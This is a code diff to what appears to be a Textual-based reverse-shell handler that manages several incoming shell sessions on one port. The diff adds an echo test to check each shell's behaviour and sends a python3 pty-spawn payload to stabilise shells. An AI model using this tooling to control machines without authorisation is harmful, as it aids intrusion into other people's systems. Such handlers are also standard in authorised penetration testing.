@@ -77,7 +77,7 @@ class NShellsOnePortApp(App):
             await self.session_list_view.clear()
             self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])
 
-    async def rshell_client(self, reader, writer):
+    async def rshell_client(self, reader, writer) -> None:
         # errors here are silenced somehow so we need to catch them ourselves
         try:
             addr = writer.get_extra_info('peername')
@@ -89,9 +89,48 @@ class NShellsOnePortApp(App):
                 self.session_list.append(session)
             await self.update_session_list_view()
             self.log_view.write(f"[*] new session {session_name}")
+    
+            async def shell_feature_check():
+                writer.write(b"\n\n\n")
+                await writer.drain()
+                # read any potentially remaining data (banner, leftover command output)
+                try:
+                    await asyncio.wait_for(reader.read(), timeout=3)
+                except TimeoutError:
+                    pass
 
-            # TODO: somehow decide between auto-sabilization and ECHO/readline mode
-            writer.write(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+                writer.write(b"echo ns1p\n")
+                await writer.drain()
+                stdin_echo = False
+                command_echo = False
+                data = None
+                try:
+                    data = await asyncio.wait_for(reader.readline(), timeout=1)
+                    data += await asyncio.wait_for(reader.readline(), timeout=1)
+                except TimeoutError:
+                    pass
+
+                if not data:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with empty response data)")
+                elif b"ns1p" in data and not b"echo ns1p" in data:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo command but doesn't echo inputs")
+                    command_echo = True
+                elif b"echo ns1p" in data and data.count(b"ns1p") == 2:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo and echos inputs")
+                    stdin_echo = True
+                    command_echo = True
+                else:
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data)")
+
+                return (stdin_echo, command_echo)
+
+            (stdin_echo, command_echo) = await shell_feature_check()
+            if command_echo and not stdin_echo:
+                self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
+                writer.write(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+                await writer.drain()
+                (stdin_echo, command_echo) = await shell_feature_check()
+            # TODO: have some kind of readline mode
 
             while True:
                 data = await reader.read(1024)
